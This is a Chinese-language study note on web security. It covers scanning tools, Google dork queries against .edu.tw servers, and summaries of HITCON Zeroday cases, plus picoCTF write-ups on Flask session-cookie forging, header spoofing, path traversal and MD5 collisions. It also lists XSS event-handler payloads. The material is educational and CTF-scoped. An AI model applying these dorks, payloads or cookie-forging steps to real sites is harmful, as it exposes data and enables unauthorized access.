# About-Web-Security

## 弱點掃描教學

整理一些常用的掃描工具:

- DNS
    - dns resource record 
    - nslookup  
    - dig
    - WHOIS
    - dnsMAP
    - dnswalk
    - DNSenum
- SMTP
- SNMP
- Web 資源蒐集
    - httrack
    - web-archive
- 線上資源蒐集
- 網路掃描
- Others
    - [Elasticsearch](https://zh.wikipedia.org/wiki/Elasticsearch)
- [synk](https://github.com/snyk/snyk)
    - CLI and build-time tool to find & fix known vulnerabilities
    - 實用的工具，推推👍🏿

### 學會 Google Search ，你也能當駭客!

Google 搜尋引擎可以讓我們加入指定條件，搜尋到目標文件，舉例:
1. 看看誰家的 Server 洩漏出不該公開的東西
```
intitle:"index of" site:edu.tw
```
2. 以運行 PHP 後端的伺服器來說，許多設定細節都可以從 `phpinfo()` 中得到，如果版本過於老舊 & 無意間開啟的不安全的設定，
就有機會變成駭客的活箭靶喔!
```
intitle:"phpinfo" site:edu.tw
```

## 漏洞回報平台
### HITCON Zeroday

## 惡意集合體: Kali Linux

## OWASP Top 10

## 邏輯漏洞

## 資訊洩漏

## Sensitive Data Exposure

### 案例分析一: git server 忘記關
以 Hitcon Zeroday 上通報的漏洞為例
> [ZD-2020-00947](https://zeroday.hitcon.org/vulnerability/ZD-2020-00947)

因為受害單位使用私有的 Git server 做專案的版本控制，卻有沒有在 Git sever 外部做存取權限的管制，導致相關原始碼被看光光，並成功的被登入繞過以及遠端代碼執行。
### 案例分析二: 伺服器安全組態設定錯誤，文件看光光
以 Hitcon Zeroday 上通報的漏洞為例
> [ZD-2019-01264](https://zeroday.hitcon.org/vulnerability/ZD-2019-01264)

因為伺服器管理者錯誤設定了伺服器的安全組態，導致有心人士可以在目錄中查找到網站原始碼:
![](https://zeroday.hitcon.org/api/vulnerability/4877/attachments/d6e11a622df820fbf4b262efd5d2b471)
進而從原始碼當中取得資料庫的連線資訊\|/
## Broken Access Control

### 提升權限問題

### 案例分析: Most Cookies
先看題目給的 Source code :
```python=
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "blank":
			return render_template("index.html", title=title)
		else:
			return make_response(redirect("/display"))
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/search", methods=["GET", "POST"])
def search():
	if "name" in request.form and request.form["name"] in cookie_names:
		resp = make_response(redirect("/display"))
		session["very_auth"] = request.form["name"]
		return resp
	else:
		message = "That doesn't appear to be a valid cookie."
		category = "danger"
		flash(message, category)
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/reset")
def reset():
	resp = make_response(redirect("/"))
	session.pop("very_auth", None)
	return resp

@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

if __name__ == "__main__":
	app.run()


```
Flask 產生 session cookie 的方式是拿要加密資料搭配密鑰做加密(廢話)，然後從源碼可以知道密鑰會從一個陣列中隨機選取，當主頁將 session 解密時 very auth 等於 admin 的話，它就會吐 Flag 出來。

因此，我們要把陣列中每個食物名稱都拿出來當成密鑰嘗試解密:
```
py flask_session_cookie_manager3.py decode -c'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YFhuxw.bsh6ROLyRzd5_RpI3csWrRn0qQU' -s 'butter'
```
經過不斷的嘗試，發現密鑰是 `butter` ，所以我將 `butter` 作為密鑰對 `{"very_auth":"admin"}` 做 encoding :
```
py flask_session_cookie_manager3.py encode -s 'butter' -t '{"very_auth":"admin"}'
```
得到經過魔改的 session cookie 後，把它塞回網站上做重新整理後就順利拿到 Flag 啦:
```
picoCTF{pwn_4ll_th3_cook1E5_5f016958}
```

:::info 
BTW: 本次使用的加解密套件為 [Flask Session Cookie Decoder/Encoder](https://noraj.github.io/flask-session-cookie-manager/) 以及 Cookie editor 插件(非必要)。
:::

## Security Misconfiguration

## XXE

## XSS

### XSS Basic
- 反射型 / Reflected XSS
- 儲存型 / Stored XSS
- DOM Based XSS

### Event Handler
- `<svg/onload=alert(1)>`
- `<img src=# onerror=alert(1)>`
- `<input onfocus=alert(1)>`

### javascript: Scheme
- `<a href="javascript:alert(1)">Click Me</a>`
- `location.replace("javascript:alert(1)");`

### 現代框架的 data binding

以 React.js 來說，都會使用 `{}` 來做 data-binding
因此對於輸入有基本的跳脫機制，防止 XSS
但對於動態屬性綁定（dynamic attribute values）並沒有這項保護，因此有可能產生 XSS

example:

```jsx
<form action={data}></form>
```

## CSP: Content Security Policy
由瀏覽器根據 CSP 控制對外部的請求
白名單機制
Content Security Policy (CSP) Quick Reference Guide  


## SSRF

## CSRF

### 案例分析: Who are you

網站毛很多：
- user-agent
- 不想被 track
- 請求要來自瑞典
- 要會說瑞典話
- 這個網站只能在 2018 年工作

用 Node.js 解，附上程式碼 :3
```js=
let axios = require('axios');

axios
    .get('http://mercury.picoctf.net:34588/', 
{ headers: { 'User-Agent': 'picobrowser',
        'Referer': 'http://mercury.picoctf.net:34588/',
        'Date': 'Tue, 15 Nov 2018 08:12:31 GMT',
        'DNT': '1',
        'Accept-Language': 'sv',
        'Content-Language': 'sv',
        'X-Forwarded-For': '93.182.156.49'
 }  } )
    .then(response => {
      console.log(response);
      // here will be cheerio scraping
    })
    .catch(function(e) {
      console.log(e);
    });

```

## SQL Injection

## Web Shell

## Path traversal
### 實例分析: Super Serial

Flag 在這:
```
http://mercury.picoctf.net:port/%2e%2e%2f/flag
```

:::info 
利用目錄穿越， [ref](https://owasp.org/www-community/attacks/Path_Traversal) 。
:::
## 敏感資料外洩

## SSL 與 TSL 的安全問題

## 密碼學

加密:
- 對稱式加密
- 非對稱式加密

雜湊:
- 特性:
    - 不可逆
    - 抗碰撞
    - 擴張性
- 常見: MD2, MD4, MD5, SHA-0, SHA-1, SHA-2

### 案例分析: It is my Birthday

從說明可以知道， Server 會檢查兩個檔案的 md5 hash 是否相等且兩個檔案的內容必須不同。
因此，我參考 [MD5 Collision Demo](https://www.mscs.dal.ca/~selinger/md5collision/) 一文，找到了兩個 hash value 相等的 `.exe` 檔案，基本上，修改副檔名不會影響 hash value ，所以我將其修改為 `.pdf` 並上傳後，順利得到 flag :
```php=
<?php

if (isset($_POST["submit"])) {
    $type1 = $_FILES["file1"]["type"];
    $type2 = $_FILES["file2"]["type"];
    $size1 = $_FILES["file1"]["size"];
    $size2 = $_FILES["file2"]["size"];
    $SIZE_LIMIT = 18 * 1024;

    if (($size1 < $SIZE_LIMIT) && ($size2 < $SIZE_LIMIT)) {
        if (($type1 == "application/pdf") && ($type2 == "application/pdf")) {
            $contents1 = file_get_contents($_FILES["file1"]["tmp_name"]);
            $contents2 = file_get_contents($_FILES["file2"]["tmp_name"]);

            if ($contents1 != $contents2) {
                if (md5_file($_FILES["file1"]["tmp_name"]) == md5_file($_FILES["file2"]["tmp_name"])) {
                    highlight_file("index.php");
                    die();
                } else {
                    echo "MD5 hashes do not match!";
                    die();
                }
            } else {
                echo "Files are not different!";
                die();
            }
        } else {
            echo "Not a PDF!";
            die();
        }
    } else {
        echo "File too large!";
        die();
    }
}

// FLAG: picoCTF{c0ngr4ts_u_r_1nv1t3d_aebcbf39}

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <title>It is my Birthday</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>


</head>

<body>

    <div class="container">
        <div class="header">
            <h3 class="text-muted">It is my Birthday</h3>
        </div>
        <div class="jumbotron">
            <p class="lead"></p>
            <div class="row">
                <div class="col-xs-12 col-sm-12 col-md-12">
                    <h3>See if you are invited to my party!</h3>
                </div>
            </div>
            <br/>
            <div class="upload-form">
                <form role="form" action="/index.php" method="post" enctype="multipart/form-data">
                <div class="row">
                    <div class="form-group">
                        <input type="file" name="file1" id="file1" class="form-control input-lg">
                        <input type="file" name="file2" id="file2" class="form-control input-lg">
                    </div>
                </div>
                <div class="row">
                    <div class="col-xs-12 col-sm-12 col-md-12">
                        <input type="submit" class="btn btn-lg btn-success btn-block" name="submit" value="Upload">
                    </div>
                </div>
                </form>
            </div>
        </div>
    </div>
    <footer class="footer">
        <p>&copy; PicoCTF</p>
    </footer>

</div>

<script>
$(document).ready(function(){
    $(".close").click(function(){
        $("myAlert").alert("close");
    });
});
</script>
</body>

</html>
```

## 木馬攻擊
- msfvenom
    [ref](https://kknews.cc/zh-tw/code/lmqo2xg.html)
